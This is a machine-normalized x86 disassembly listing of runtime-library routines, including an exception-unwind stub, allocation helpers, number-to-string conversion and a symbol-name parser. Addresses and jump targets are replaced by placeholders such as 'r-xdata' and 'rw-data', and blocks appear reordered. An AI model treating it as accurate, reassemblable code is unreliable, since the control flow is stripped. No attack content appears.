xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_42c042
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42c078
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
pop ebp
retn 0x8
sub_42c097
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
retn
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax ]
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
call [ esi + 0x4 ]
pop ecx
sub_42c0bf
mov ecx [ rw-data ]
mov dl [ ecx ]
test dl dl
jne r-xdata
cmp dl 0x30
jl r-xdata
xor eax eax
retn
xor eax eax
jmp r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x40
jne r-xdata
movsx eax dl
sub eax 0x2f
inc ecx
mov [ rw-data ] ecx
retn
test dl dl
je r-xdata
mov dl [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp dl 0x40
je r-xdata
cmp dl 0x41
jl r-xdata
retn
or eax 0xffffffff
cmp dl 0x50
jg r-xdata
movsx edx dl
add eax eax
inc ecx
lea eax [ edx + eax * 8 - 0x41 ]
mov [ rw-data ] ecx
mov dl [ ecx ]
sub_42c121
mov ecx [ rw-data ]
push ebx
push esi
mov edx 0x4000
push edi
mov al [ ecx ]
cmp al 0x41
jl r-xdata
inc ecx
mov esi edx
mov [ rw-data ] ecx
cmp al 0x24
jne r-xdata
cmp al 0x5a
jle r-xdata
mov al [ ecx ]
cmp al 0x30
jl r-xdata
xor bl bl
inc ecx
mov [ rw-data ] ecx
movsx eax [ ecx ]
cmp eax 0x42
jg r-xdata
movsx eax [ ecx ]
sub eax 0x41
mov edx 0x8000
inc ecx
or esi edx
mov [ rw-data ] ecx
test al 0x1
je r-xdata
cmp al 0x39
jne r-xdata
cmp al 0x38
jg r-xdata
sub eax 0x43
je r-xdata
je r-xdata
and esi 0xffffdfff
or esi 0x2000
jmp r-xdata
xor ecx ecx
test al al
setne cl
lea esi [ ecx + 0xfffe ]
inc ecx
mov [ rw-data ] ecx
mov esi 0xfffd
jmp r-xdata
movsx eax al
inc ecx
add eax 0xffffffd0
and esi 0xffff7fff
mov [ rw-data ] ecx
cmp eax 0x8
ja r-xdata
or esi 0x7c00
dec eax
je r-xdata
or esi 0x9800
jmp r-xdata
test eax eax
je r-xdata
mov eax esi
mov ebx 0xffff9fff
mov edi 0x800
test edx esi
je r-xdata
cmp eax 0x18
jge r-xdata
mov eax 0xffff
jmp r-xdata
jmp [ eax * 4 + jump_table_42c5e1 ]
and esi 0xfffff5ff
or esi 0x9100
jmp r-xdata
dec eax
je r-xdata
inc ecx
mov [ rw-data ] ecx
jmp r-xdata
mov esi 0xfffe
dec ecx
jmp r-xdata
cmp eax 0x24
jne r-xdata
and esi ebx
and esi 0xffffefff
or esi edi
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx 0x8000
test edx esi
je r-xdata
mov edx 0x8000
test edx esi
je r-xdata
mov edx 0x8000
test edx esi
je r-xdata
and esi 0xffffdfff
or esi edx
jmp r-xdata
and esi 0xffffe3ff
or esi 0x6000
jmp r-xdata
and esi 0xffffbfff
or esi 0x2000
jmp r-xdata
and esi 0xffffebff
or esi 0x6800
jmp r-xdata
and esi 0xfffff3ff
or esi 0x7000
jmp r-xdata
and esi 0xfffffbff
or esi 0x7800
jmp r-xdata
and esi 0xfffff6ff
or esi 0x9200
jmp r-xdata
sub eax 0xd
jne r-xdata
cmp eax 0x2f
jle r-xdata
cmp [ ecx + 0x1 ] 0x50
jne r-xdata
test edx esi
je r-xdata
cmp ecx 0x8
je r-xdata
mov ecx eax
and ecx 0x18
je r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
inc ecx
mov [ rw-data ] ecx
mov al [ ecx ]
mov bl 0x1
cmp al 0x30
jl r-xdata
cmp eax 0x35
jle r-xdata
inc ecx
mov [ rw-data ] ecx
movsx eax [ ecx ]
cmp eax 0x4a
jg r-xdata
inc ecx
and esi 0xffffefff
or esi edi
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
cmp ecx 0x10
je r-xdata
and esi 0xffffefff
or esi 0x800
jmp r-xdata
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
test edx esi
je r-xdata
xor ecx ecx
test al al
sete cl
lea eax [ ecx + 0xfffe ]
jmp r-xdata
cmp al 0x35
jg r-xdata
movsx eax [ ecx ]
mov edx 0x8000
or esi edx
sub eax 0x30
mov edi 0x800
test edx esi
je r-xdata
cmp eax 0x41
jne r-xdata
cmp eax 0x4c
jl r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
and eax 0x6
sub eax 0x0
je r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffff9fff
and esi 0xffffefff
or esi edi
jmp r-xdata
and esi 0xfffff4ff
or esi 0x9000
jmp r-xdata
cmp eax 0x4d
jle r-xdata
inc ecx
mov [ rw-data ] ecx
mov al [ ecx ]
cmp al 0x30
jl r-xdata
sub eax 0x0
je r-xdata
test edx esi
je r-xdata
dec eax
dec eax
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
and esi 0xfffffdff
or esi 0x500
and esi 0xfffffeff
or esi 0x600
jmp r-xdata
test bl bl
je r-xdata
inc ecx
mov [ rw-data ] ecx
jmp r-xdata
cmp eax 0x4f
jle r-xdata
mov esi 0xffff
jmp r-xdata
cmp al 0x39
jg r-xdata
mov eax 0xfffe
jmp r-xdata
sub eax 0x46
je r-xdata
and esi ebx
jmp r-xdata
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xfffff9ff
or esi 0x100
jmp r-xdata
dec eax
dec eax
jne r-xdata
and esi 0xffffdfff
or esi 0x2000
jmp r-xdata
test al 0x1
je r-xdata
xor esi esi
cmp [ ecx ] 0x5f
jne r-xdata
cmp eax 0x51
movsx eax al
lea eax [ ecx + eax - 0x2f ]
mov [ rw-data ] eax
call sub_42c121
or eax 0x10000
jmp r-xdata
dec eax
dec eax
jmp r-xdata
and esi 0xfffffcff
or esi 0x400
jmp r-xdata
test edx esi
je r-xdata
dec eax
dec eax
je r-xdata
and eax 0x6
sub eax 0x0
je r-xdata
jne r-xdata
and esi 0xffffefff
or esi edi
jmp r-xdata
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
dec eax
dec eax
jne r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
sub_42c6f8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0x7
and edi 0xfffffff8
cmp [ ebp + 0xc ] 0x0
mov esi ecx
je r-xdata
test edi edi
jne r-xdata
push edi
call [ esi ]
pop ecx
jmp r-xdata
mov eax [ esi + 0x10 ]
push ebx
cmp eax edi
jae r-xdata
push 0x8
pop edi
pop edi
pop esi
pop ebp
retn 0x8
sub eax edi
mov [ esi + 0x10 ] eax
mov ebx 0x1000
cmp edi ebx
ja r-xdata
xor eax eax
jmp r-xdata
push 0x1
push 0x1004
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
pop ebx
xor eax eax
and [ eax ] 0x0
jmp r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx + 0x4 ]
sub ebx edi
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ebx
jmp r-xdata
sub_42c890
mov edi edi
push ebp
mov ebp esp
mov eax ecx
cmp [ eax + 0x4 ] 0x3
je r-xdata
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x4 ]
cmp dl 0x1
jle r-xdata
mov [ eax + 0x4 ] dl
sub_42c915
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
test ecx ecx
je r-xdata
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
mov dl [ ecx + 0x4 ]
cmp dl 0x2
je r-xdata
xor ecx ecx
cmp dl 0x3
jne r-xdata
sub_42c96c
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_42c98d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax ecx
mov [ eax + 0x4 ] edx
dec edx
neg edx
sbb edx edx
and edx 0xfffffffc
add edx 0x4
mov [ eax ] r--data
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_42c9c2
mov edi edi
push ebp
mov ebp esp
xor ecx ecx
inc ecx
test [ rw-data ] cl
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x3
ja r-xdata
or [ rw-data ] ecx
mov eax r--data
xor edx edx
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x4
mov [ rw-data ] eax
mov [ rw-data ] 0x2
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] 0x3
mov [ rw-data ] edx
mov eax rw-data
pop ebp
retn
imul eax eax 0xc
add eax rw-data
pop ebp
retn
sub_42ca69
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
jge r-xdata
mov eax [ esi + 0xc ]
pop esi
retn
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
push ebx
push edi
mov edi [ esi + 0x4 ]
call [ eax ]
mov ebx eax
mov eax [ edi ]
mov ecx edi
call [ eax ]
add ebx eax
pop edi
mov [ esi + 0xc ] ebx
pop ebx
sub_42ca94
mov edi edi
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
test al al
jne r-xdata
pop esi
retn
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
pop esi
jmp [ eax + 0x4 ]
sub_42cab0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
push eax
call [ edx + 0x8 ]
sub_42caea
mov edi edi
push esi
mov esi edx
test esi esi
je r-xdata
pop esi
retn
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_42cb00
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
dec [ ebp + 0x8 ]
jne r-xdata
xor eax eax
pop ebp
retn
mov al [ ecx ]
test al al
je r-xdata
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
cmp al [ edx ]
jne r-xdata
inc ecx
inc edx
sub_42cb2a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax ecx
or [ eax ] 0xffffffff
lea ecx [ eax + 0x2c ]
or [ ecx ] 0xffffffff
mov [ rw-data ] edx
mov [ rw-data ] edx
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push esi
mov esi [ ebp + 0x10 ]
mov [ rw-data ] esi
mov [ rw-data ] edx
pop esi
jmp r-xdata
mov [ rw-data ] ecx
mov ecx [ ebp + 0x18 ]
mov [ rw-data ] ecx
mov ecx [ ebp + 0x14 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
pop ebp
retn 0x14
sub_42cb99
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor ecx ecx
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
call sub_430a18
mov eax [ ebp + 0x8 ]
add esp 0x14
leave
retn
sub_42cbd2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x10 ] 0x0
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
push 0x1
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_430a18
mov eax [ ebp + 0x8 ]
add esp 0x14
leave
retn
sub_42cc23
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
sub eax edi
cmp esi eax
jle r-xdata
test esi esi
je r-xdata
mov esi eax
lea eax [ edi + esi ]
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx edi
sub eax edi
mov edx esi
push ebx
mov bl [ eax + ecx ]
mov [ ecx ] bl
inc ecx
dec edx
jne r-xdata
pop ebx
sub_42cc5a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push 0x0
push 0x8
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
call sub_42c915
jmp r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
mov [ esi ] eax
setne al
dec al
and al 0x3
mov [ esi + 0x4 ] al
jmp r-xdata
sub_42ccad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
and [ esi + 0x4 ] 0xffff00ff
cmp ecx 0x2
je r-xdata
mov eax ecx
cmp ecx 0x3
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ecx
call sub_42c9c2
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x4 ] 0x3
and [ esi ] 0x0
mov [ esi + 0x4 ] al
cmp ecx 0x1
jne r-xdata
sub_42ccf2
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test ecx ecx
je r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov [ esi ] 0x0
mov edi [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax ]
lea edi [ eax + 0x1 ]
push esi
push edi
mov ecx rw-data
call sub_42c6f8
mov esi eax
test esi esi
je r-xdata
mov eax [ ecx ]
lea edx [ esi + edi - 0x1 ]
push edx
push esi
call [ eax + 0x8 ]
mov eax esi
jmp r-xdata
jmp r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebx ]
test ecx ecx
jne r-xdata
sub_42cd51
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x10
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
xor eax eax
mov ecx [ esi ]
or [ eax + 0xc ] 0xffffffff
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_42cd99
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x8
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
call sub_42c915
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_42cde6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] al
cmp eax 0x1
jne r-xdata
and [ esi ] 0x0
push eax
call sub_42c9c2
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x3
jmp r-xdata
sub_42ce1d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi ] 0x9
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
pop edi
push 0x0
push 0x8
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
xor eax eax
mov ecx [ edi ]
mov [ eax ] ecx
mov ecx [ edi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
inc [ esi ]
mov ecx [ esi ]
mov [ esi + ecx * 4 + 0x4 ] eax
test eax eax
je r-xdata
sub_42ce67
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x9
ja r-xdata
mov ecx [ ebp + 0x8 ]
push 0x3
call sub_42ccad
mov eax [ ebp + 0x8 ]
mov edx [ ecx ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
cmp eax edx
jg r-xdata
pop ebp
retn 0x8
mov ecx [ ecx + eax * 4 + 0x4 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_42ceb6
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
mov [ esi ] r--data
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov ecx rw-data
call sub_42c6f8
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
jmp r-xdata
sub_42cf40
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x4
push r--data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42cc23
add esp 0x10
jmp r-xdata
pop ebp
retn 0x8
sub_42cf69
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp [ eax ] 0x40
push [ ebp + 0xc ]
jne r-xdata
push [ ebp + 0x8 ]
call sub_4318f5
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
inc [ rw-data ]
call sub_42cc5a
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_42cfad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
push eax
call sub_42cde6
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
test eax eax
je r-xdata
push eax
call sub_42c9c2
pop ecx
push eax
mov ecx esi
call sub_42cd51
jmp r-xdata
sub_42cfef
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] 0x3
mov [ esi ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x2
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
sub eax ebx
je r-xdata
mov [ esi + 0x4 ] 0x3
jmp r-xdata
dec eax
push ebx
mov ecx rw-data
je r-xdata
pop edi
push 0x8
call sub_42c6f8
cmp eax ebx
je r-xdata
push 0xc
call sub_42c6f8
cmp eax ebx
je r-xdata
xor eax eax
mov cl [ edi ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
jmp r-xdata
push [ ebp + 0xc ]
mov ecx eax
push edi
call sub_42ceb6
jmp r-xdata
mov [ esi ] eax
cmp eax ebx
jne r-xdata
sub_42d072
mov edi edi
push ebp
mov ebp esp
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ebp + 0x8 ] al
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_42cfef
sub_42d09f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push esi
mov esi ecx
mov [ esi + 0x4 ] dl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] edx
cmp eax edx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
xor ecx ecx
cmp [ eax ] dl
je r-xdata
inc ecx
cmp [ ecx + eax ] dl
jne r-xdata
cmp ecx edx
jbe r-xdata
push ecx
push eax
mov ecx esi
call sub_42cfef
sub_42d0dc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor edx edx
push edi
mov edi ecx
mov [ edi + 0x4 ] dl
and [ edi + 0x4 ] 0xffff00ff
mov [ edi ] edx
mov eax [ esi ]
cmp eax edx
je r-xdata
mov [ edi + 0x4 ] 0x2
cmp [ eax ] dl
je r-xdata
mov [ edi + 0x4 ] 0x1
jmp r-xdata
mov [ ebp + 0x8 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x8
push edx
push [ ebp + 0x8 ]
mov ecx edi
call sub_42cfef
mov eax [ esi ]
mov cl [ eax ]
test cl cl
je r-xdata
cmp al 0x5f
je r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
inc eax
mov [ esi ] eax
cmp cl [ ebp + 0xc ]
je r-xdata
inc edx
inc ecx
mov eax ecx
mov [ esi ] ecx
cmp [ eax ] 0x0
jne r-xdata
cmp al 0x24
je r-xdata
and [ edi ] 0x0
mov [ edi + 0x4 ] 0x3
jmp r-xdata
mov ecx [ esi ]
mov al [ ecx ]
cmp al [ ebp + 0xc ]
je r-xdata
cmp al 0x3c
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x2d
je r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x7a
jle r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x5a
jle r-xdata
cmp al 0x80
jb r-xdata
cmp al 0x39
jle r-xdata
test [ rw-data ] 0x10000
je r-xdata
cmp al 0xfe
jbe r-xdata
sub_42d19b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor eax eax
push esi
mov esi ecx
push edi
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
lea edi [ ebp - 0x8 ]
mov [ esi ] eax
mov [ ebp - 0x8 ] al
push 0x0
push 0xa
push [ ebp + 0xc ]
dec edi
push [ ebp + 0x8 ]
call sub_437480
add cl 0x30
mov [ ebp + 0x8 ] eax
or eax edx
mov [ ebp - 0x20 ] ebx
mov [ edi ] cl
mov [ ebp + 0xc ] edx
jne r-xdata
lea eax [ ebp - 0x8 ]
sub eax edi
push eax
push edi
mov ecx esi
call sub_42cfef
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn 0x8
sub_42d209
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
xor ecx ecx
mov [ esi + 0x4 ] cl
and [ esi + 0x4 ] 0xffff00ff
push edi
lea edi [ ebp - 0x7 ]
mov [ esi ] ecx
mov [ ebp - 0x7 ] cl
mov [ ebp - 0x1d ] cl
cmp eax ecx
jg r-xdata
push ebx
jmp r-xdata
jl r-xdata
push ecx
push 0xa
push eax
push [ ebp + 0x8 ]
dec edi
call sub_437480
add cl 0x30
mov [ ebp + 0x8 ] eax
mov [ edi ] cl
mov ecx [ ebp + 0x8 ]
mov eax edx
or ecx eax
mov [ ebp - 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
neg edx
adc eax ecx
mov [ ebp - 0x1d ] 0x1
neg eax
mov [ ebp + 0x8 ] edx
cmp [ ebp + 0x8 ] ecx
jae r-xdata
xor ecx ecx
pop ebx
cmp [ ebp - 0x1d ] cl
je r-xdata
lea eax [ ebp - 0x7 ]
sub eax edi
push eax
push edi
mov ecx esi
call sub_42cfef
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn 0x8
dec edi
mov [ edi ] 0x2d
sub_42d2a4
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_42cfad
mov eax esi
pop esi
pop ebp
retn 0x8
sub_42d2c8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
movsx eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_42cfad
jmp r-xdata
push ecx
mov ecx esi
call sub_42cd51
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_42d30b
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x1
jg r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
cmp [ edi ] 0x0
jne r-xdata
mov al [ esi + 0x4 ]
test al al
je r-xdata
push esi
call sub_42cd99
jmp r-xdata
push 0x0
push 0x8
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
cmp al 0x1
je r-xdata
xor eax eax
push esi
mov ecx eax
call sub_42c915
jmp r-xdata
movsx eax al
push eax
call sub_42cfad
jmp r-xdata
push eax
mov ecx edi
call sub_42cd51
sub_42d372
mov edi edi
push ebp
mov ebp esp
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ebp + 0x8 ] al
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_42cfef
sub_42d39f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push esi
mov esi ecx
mov [ esi + 0x4 ] dl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] edx
xor ecx ecx
cmp [ eax ] dl
je r-xdata
push ecx
push eax
mov ecx esi
call sub_42cfef
mov eax esi
pop esi
pop ebp
retn 0x4
inc ecx
cmp [ ecx + eax ] dl
jne r-xdata
sub_42d3d4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
mov eax [ ebp + 0x8 ]
leave
retn
movsx eax al
sub eax 0x41
